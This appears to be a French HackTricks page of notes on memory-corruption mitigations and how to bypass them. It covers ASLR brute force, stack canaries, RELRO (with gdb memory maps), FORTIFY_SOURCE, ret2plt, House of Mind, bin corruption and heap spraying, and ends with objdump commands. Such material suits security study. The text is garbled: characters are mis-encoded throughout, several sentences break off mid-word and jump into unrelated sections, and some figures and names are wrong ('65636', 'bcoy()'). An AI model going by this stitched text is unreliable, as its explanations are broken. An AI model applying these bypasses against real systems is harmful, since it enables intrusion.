M√©moire allou√©e par mmap() et biblioth√®ques partag√©es ‚Äî> 16 bits, delta\_mmap

La pile ‚Äî> 24 bits, delta\_stack ‚Äî> En r√©alit√© 11 (du 10√®me au 20√®me octet inclus) ‚Äî> align√© sur 16 octets ‚Äî> 524 288 adresses r√©elles possibles de la pile

Les variables d'environnement et les arguments se d√©placent moins qu'un tampon sur la pile.

**Return-into-printf**

C'est une technique pour convertir un d√©bordement de tampon en une erreur de cha√Æne de format. Elle consiste √† remplacer l'EIP pour qu'il pointe vers un printf de la fonction et √† lui passer comme argument une cha√Æne de format manipul√©e pour obtenir des valeurs sur l'√©tat du processus.

**Attaque de biblioth√®ques**

Les biblioth√®ques sont √† une position avec 16 bits d'al√©atoire = 65636 adresses possibles. Si un serveur vuln√©rable appelle fork(), l'espace d'adressage m√©moire est clon√© dans le processus enfant et reste intact. Ainsi, il est possible d'essayer de faire une force brute √† la fonction usleep() de libc en lui passant "16" comme argument, de sorte que lorsque cela prend plus de temps que d'habitude pour r√©pondre, cette fonction est trouv√©e. En sachant o√π se trouve cette fonction, delta\_mmap peut √™tre obtenu et les autres calcul√©s.

La seule fa√ßon d'√™tre s√ªr que l'ASLR fonctionne est d'utiliser une architecture 64 bits. Il n'y a pas d'attaques de force brute l√†-bas.

**StackGuard et StackShield**

**StackGuard** ins√®re avant l'EIP ‚Äî> 0x000aff0d(null, \n, EndOfFile(EOF), \r) ‚Äî> recv(), memcpy(), read(), bcoy() restent vuln√©rables et ne prot√®ge pas l'EBP

**StackShield** est plus √©labor√© que StackGuard

Il stocke dans une table (Global Return Stack) toutes les adresses EIP de retour de sorte que le d√©bordement ne cause aucun dommage. De plus, les deux adresses peuvent √™tre compar√©es pour voir s'il y a eu un d√©bordement.

On peut √©galement v√©rifier l'adresse de retour avec une valeur limite, ainsi si l'EIP va √† un endroit diff√©rent de celui habituel comme l'espace de donn√©es, on le saura. Mais cela peut √™tre contourn√© avec Ret-to-lib, ROPs ou ret2ret.

Comme on peut le voir, stackshield ne prot√®ge pas non plus les variables locales.

**Stack Smash Protector (ProPolice) -fstack-protector**

Le canary est plac√© avant l'EBP. Il r√©organise les variables locales pour que les tampons soient aux positions les plus √©lev√©es et ne puissent donc pas √©craser d'autres variables.

De plus, il effectue une copie s√©curis√©e des arguments pass√©s sur la pile (au-dessus des variables locales) et utilise ces copies comme arguments.

Il ne peut pas prot√©ger les tableaux de moins de 8 √©l√©ments ni les tampons faisant partie d'une structure utilisateur.

Le canary est un nombre al√©atoire extrait de "/dev/urandom" ou sinon c'est 0xff0a0000. Il est stock√© dans TLS (Thread Local Storage). Les threads partagent le m√™me espace m√©moire, le TLS est une zone qui contient des variables globales ou statiques de chaque thread. Cependant, en principe, celles-ci sont copi√©es du processus parent bien que le processus enfant puisse modifier ces donn√©es sans modifier celles du parent ni celles des autres enfants. Le probl√®me est que si fork() est utilis√© mais qu'aucun nouveau canari n'est cr√©√©, alors tous les processus (parent et enfants) utilisent le m√™me canari. En i386, il est stock√© dans gs:0x14 et en x86\_64, il est stock√© dans fs:0x28.

Cette
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
  0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sans relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
  0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Pour le binaire **sans relro**, nous pouvons voir que l'adresse d'entr√©e `got` pour `fgets` est `0x404018`. En regardant les mappages de m√©moire, nous voyons qu'elle se situe entre `0x404000` et `0x405000`, qui ont les **permissions `rw`**, ce qui signifie que nous pouvons y lire et √©crire. Pour le binaire **avec relro**, nous voyons que l'adresse de la table `got` pour l'ex√©cution du binaire (pie est activ√© donc cette adresse changera) est `0x555555557fd0`. Dans la carte m√©moire de ce binaire, elle se situe entre `0x0000555555557000` et `0x0000555555558000`, qui a la m√©moire **permission `r`**, ce qui signifie que nous ne pouvons que lire √† partir de l√†.

Alors quelle est la **contournement**? Le contournement typique que j'utilise est de simplement ne pas √©crire dans les r√©gions de m√©moire que relro rend en lecture seule, et de **trouver un autre moyen d'obtenir l'ex√©cution du code**.

Notez que pour que cela se produise, le binaire doit conna√Ætre avant l'ex√©cution les adresses des fonctions:

* Lazy binding: L'adresse d'une fonction est recherch√©e la premi√®re fois que la fonction est appel√©e. Ainsi, la GOT doit avoir des autorisations d'√©criture pendant l'ex√©cution.
* Bind now: Les adresses des fonctions sont r√©solues au d√©but de l'ex√©cution, puis des autorisations en lecture seule sont donn√©es aux sections sensibles comme .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Pour v√©rifier si un programme utilise Bind now, vous pouvez faire:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Lorsque le binaire est charg√© en m√©moire et qu'une fonction est appel√©e pour la premi√®re fois, il saute √† la PLT (Procedure Linkage Table), d'o√π il effectue un saut (jmp) √† la GOT et d√©couvre que cette entr√©e n'a pas √©t√© r√©solue (elle contient une adresse suivante de la PLT). Il invoque alors le Runtime Linker ou rtfd pour r√©soudre l'adresse et la stocker dans la GOT.

Lorsqu'une fonction est appel√©e, la PLT est appel√©e, elle contient l'adresse de la GOT o√π l'adresse de la fonction est stock√©e, redirigeant ainsi le flux vers celle-ci et appelant la fonction. Cependant, si c'est la premi√®re fois que la fonction est appel√©e, ce qui se trouve dans la GOT est l'instruction suivante de la PLT, donc le flux suit le code de la PLT (rtfd) et d√©couvre l'adresse de la fonction, la stocke dans la GOT et l'appelle.

Lorsqu'un binaire est charg√© en m√©moire, le compilateur lui a indiqu√© √† quel offset il doit placer les donn√©es qui doivent √™tre charg√©es lors de l'ex√©cution du programme.

Lazy binding -> L'adresse de la fonction est recherch√©e la premi√®re fois que cette fonction est appel√©e, de sorte que la GOT a des autorisations d'√©criture pour que lorsqu'elle est recherch√©e, elle soit stock√©e l√† et qu'il ne soit pas n√©cessaire de la rechercher √† nouveau.

Bind now -> Les adresses des fonctions sont recherch√©es lors du chargement du programme et les autorisations des sections .got, .dtors, .ctors, .dynamic, .jcr sont modifi√©es en lecture seule. **-z relro** et **-z now**

Malgr√© cela, en g√©n√©ral, les programmes ne sont pas compliqu√©s avec ces options, donc ces attaques restent possibles.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** -> Pour savoir s'ils utilisent BIND NOW

**Fortify Source -D_FORTIFY_SOURCE=1 ou =2**

Essaie d'identifier les fonctions qui copient d'un endroit √† un autre de mani√®re non s√©curis√©e et de remplacer la fonction par une fonction s√ªre.

Par exemple :\
char buf[16];\
strcpy(but, source);

Il l'identifie comme non s√©curis√© et remplace alors strcpy() par \_\_strcpy\_chk() en utilisant la taille du tampon comme taille maximale √† copier.

La diff√©rence entre **=1** ou **=2** est que :

La seconde ne permet pas que **%n** vienne d'une section avec des autorisations d'√©criture. De plus, le param√®tre pour l'acc√®s direct aux arguments ne peut √™tre utilis√© que si les pr√©c√©dents sont utilis√©s, c'est-√†-dire que seul **%3$d** peut √™tre utilis√© s'il a √©t√© pr√©c√©d√© de **%2$d** et **%1$d**.

Pour afficher le message d'erreur, on utilise argv\[0\], donc si on y met l'adresse d'un autre endroit (comme une variable globale), le message d'erreur affichera le contenu de cette variable. Page 191

**Remplacement de Libsafe**

Il est activ√© avec : LD\_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Il intercepte les appels √† certaines fonctions non s√©curis√©es par d'autres s√©curis√©es. Ce n'est pas normalis√©. (uniquement pour x86, pas pour les compilations avec -fomit-frame-pointer, pas de compilations statiques, toutes les fonctions vuln√©rables ne deviennent pas s√ªres et LD\_PRELOAD ne fonctionne pas sur les binaires avec suid).

**Espace d'adressage ASCII Armored**

Consiste √† charger les biblioth√®ques partag√©es de 0x00000000 √† 0x00ffffff pour qu'il y ait toujours un octet 0x00. Cependant, cela ne permet pratiquement pas d'arr√™ter les attaques, et encore moins en little endian.

**ret2plt**

Consiste √† r√©aliser un ROP de mani√®re √† appeler la fonction strcpy@plt (de la plt) et √† pointer vers l'entr√©e de la GOT et √† copier le premier octet de la fonction √† laquelle on veut appeler (system()). Ensuite, on fait la m√™me chose en pointant vers GOT+1 et en copiant le 2√®me octet de system()... En fin de compte, on appelle l'adresse stock√©e dans GOT
Si vous voulez r√©utiliser un pointeur, cela ne posera aucun probl√®me. Si vous voulez en utiliser un autre, il sera assign√© au m√™me espace, ce qui faussera les pointeurs "fd" et "bk" avec les donn√©es de la r√©servation pr√©c√©dente.

**Apr√®s free()**

Un pointeur pr√©c√©demment lib√©r√© est r√©utilis√© sans contr√¥le.

## **8 D√©bordements de tas : Exploits avanc√©s**

Les techniques Unlink() et FrontLink() ont √©t√© supprim√©es en modifiant la fonction unlink().

**The house of mind**

Seule une seule appel √† free() est n√©cessaire pour provoquer l'ex√©cution de code arbitraire. Il est int√©ressant de chercher un deuxi√®me morceau qui peut √™tre d√©bord√© par un pr√©c√©dent et lib√©r√©.

Un appel √† free() appelle public\_fREe(mem), qui fait :

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Renvoie un pointeur √† l'adresse o√π commence le morceau (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

En \[1], il v√©rifie le champ size du bit NON\_MAIN\_ARENA, qui peut √™tre alt√©r√© pour que la v√©rification renvoie true et ex√©cute heap\_for\_ptr() qui fait un and √† "mem", laissant les 2,5 octets les moins importants √† 0 (dans notre cas de 0x0804a000, il laisse 0x08000000) et acc√®de √† 0x08000000->ar\_ptr (comme s'il s'agissait d'une structure heap\_info).

De cette fa√ßon, si nous pouvons contr√¥ler un morceau par exemple √† 0x0804a000 et qu'un morceau est sur le point d'√™tre lib√©r√© √† **0x081002a0**, nous pouvons atteindre l'adresse 0x08100000 et √©crire ce que nous voulons, par exemple **0x0804a000**. Lorsque ce deuxi√®me morceau sera lib√©r√©, heap\_for\_ptr(ptr)->ar\_ptr trouvera ce que nous avons √©crit √† 0x08100000 (car l'and que nous avons vu pr√©c√©demment est appliqu√© √† 0x081002a0 et la valeur des 4 premiers octets, l'ar\_ptr, est extraite de l√†).

De cette fa√ßon, \_int\_free(ar\_ptr, mem) est appel√©, c'est-√†-dire, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Comme nous l'avons vu pr√©c√©demment, nous pouvons contr√¥ler la valeur de av, car c'est ce que nous √©crivons dans le morceau qui va √™tre lib√©r√©.

Comme unsorted\_chunks est d√©fini, nous savons que :\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Par cons√©quent, si nous √©crivons la valeur de \_\_DTOR\_END\_\_-12 dans av->bins\[2], la derni√®re instruction √©crira dans \_\_DTOR\_END\_\_ l'adresse du deuxi√®me morceau.

C'est-√†-dire que dans le premier morceau, nous devons mettre au d√©but plusieurs fois l'adresse de \_\_DTOR\_END\_\_-12 car av->bins\[2\] la prendra de l√†.

Dans l'adresse o√π tombe l'adresse du deuxi√®me morceau avec les 5 derniers z√©ros, nous devons √©crire l'adresse de ce premier morceau pour que heap\_for\_ptr() pense que l'ar\_ptr est au d√©but du premier mor
bin->bk = bck; Le deuxi√®me √† partir de la fin devient le dernier, si bck pointe vers le stack au prochain morceau r√©serv√©, cette adresse lui sera donn√©e.

bck->fd = bin; La liste est ferm√©e en la faisant pointer vers bin.

Il est n√©cessaire de :

- R√©server deux malloc, de sorte que le premier puisse √™tre d√©bord√© apr√®s que le second ait √©t√© lib√©r√© et introduit dans son bin (c'est-√†-dire qu'un malloc sup√©rieur au deuxi√®me morceau ait √©t√© r√©serv√© avant le d√©bordement).
- Contr√¥ler le malloc r√©serv√© √† l'adresse choisie par l'attaquant.

L'objectif est le suivant : si nous pouvons d√©border un tas qui a en dessous un morceau d√©j√† lib√©r√© et dans son bin, nous pouvons modifier son pointeur bk. Si nous modifions son pointeur bk et que ce morceau devient le premier de la liste de bin et qu'il est r√©serv√©, bin sera tromp√© et on lui dira que le dernier morceau de la liste (le suivant √† offrir) est √† l'adresse fausse que nous avons mise (sur le stack ou GOT par exemple). Ainsi, si un autre morceau est r√©serv√© et que l'attaquant a des autorisations dessus, un morceau sera donn√© √† la position souhait√©e et il pourra √©crire dedans.

Apr√®s avoir lib√©r√© le morceau modifi√©, il est n√©cessaire de r√©server un morceau plus grand que celui qui a √©t√© lib√©r√©, de sorte que le morceau modifi√© sorte des unsorted bins et soit introduit dans son bin.

Une fois dans son bin, il est temps de modifier son pointeur bk via le d√©bordement pour qu'il pointe vers l'adresse que nous voulons √©craser.

Ainsi, le bin devra attendre son tour jusqu'√† ce que suffisamment d'appels √† malloc() soient effectu√©s pour que le bin modifi√© soit r√©utilis√© et trompe bin en lui faisant croire que le morceau suivant est √† l'adresse fausse. Et ensuite, le morceau qui nous int√©resse sera donn√©.

Pour que la vuln√©rabilit√© soit ex√©cut√©e le plus rapidement possible, il est id√©al de : r√©server le morceau vuln√©rable, r√©server le morceau qui sera modifi√©, lib√©rer ce morceau, r√©server un morceau plus grand que celui qui sera modifi√©, modifier le morceau (vuln√©rabilit√©), r√©server un morceau de m√™me taille que celui qui a √©t√© viol√© et r√©server un deuxi√®me morceau de m√™me taille et ce sera celui qui pointera vers l'adresse choisie.

Pour prot√©ger cette attaque, la v√©rification typique est utilis√©e pour s'assurer que le morceau n'est pas faux : on v√©rifie si bck->fd pointe vers victim. C'est-√†-dire que dans notre cas, si le pointeur fd* du faux morceau point√© sur le stack pointe vers victim. Pour d√©passer cette protection, l'attaquant devrait √™tre capable d'√©crire d'une mani√®re ou d'une autre (probablement sur le stack) √† l'adresse appropri√©e de la direction de victim. Ainsi, cela ressemblera √† un vrai morceau.

**Corruption LargeBin**

Les m√™mes exigences sont n√©cessaires qu'auparavant et quelques autres, en outre, les morceaux r√©serv√©s doivent √™tre sup√©rieurs √† 512.

L'attaque est la m√™me que pr√©c√©demment, c'est-√†-dire qu'il faut modifier le pointeur bk et toutes ces appels √† malloc() sont n√©cessaires, mais il faut √©galement modifier la taille du morceau modifi√© de sorte que cette taille - nb soit < MINSIZE.

Par exemple, il faudra mettre en taille 1552 pour que 1552 - 1544 = 8 < MINSIZE (la soustraction ne peut pas √™tre n√©gative car elle compare un unsigned).

De plus, un correctif a √©t√© introduit pour le rendre encore plus compliqu√©.

**Heap Spraying**

Essentiellement, il consiste √† r√©server toute la m√©moire possible pour les tas et √† les remplir d'un matelas de nops fini par une shellcode. De plus, 0x0c est utilis√© comme matelas. On essaiera donc de sauter √† l'adresse 0x0c0c0c0c, et ainsi, si une adresse √† laquelle on va appeler est √©cras√©e avec ce matelas, on sautera l√†-bas. Fondamentalement, la tactique consiste √† r√©server autant que possible pour voir si un pointeur est √©cras√© et √† sauter √† 0x0c0c0c0c en esp√©rant qu'il y ait des nops l√†-bas.

**Heap Feng Shui**

Il consiste √† semer la m√©moire en r√©servant et en lib√©rant des morceaux de sorte qu'il reste des morceaux r√©serv√©s entre des morceaux libres. Le tampon √† d√©border sera situ√© dans l'un des ≈ìufs.

**objdump -d executable** ‚Äî> Disas fonctions\
**objdump -d ./PROGRAMME | grep FONCTION** ‚Äî> Obtenir l'adresse de la fonction\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour voir que c'est effectivement notre shellcode et obtenir les OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Table des symboles, pour obtenir l'adresse des variables et des fonctions\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Pour obtenir l'adresse des fonctions des biblioth√®ques (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Obtient l'adresse de puts √† √©craser dans le GOT\
**objdump -D ./exec** ‚Äî> Disas ALL jusqu'aux entr√©es de la plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info de la fonction dans gdb

## Cours int√©ressants

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **R√©f√©rences**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github
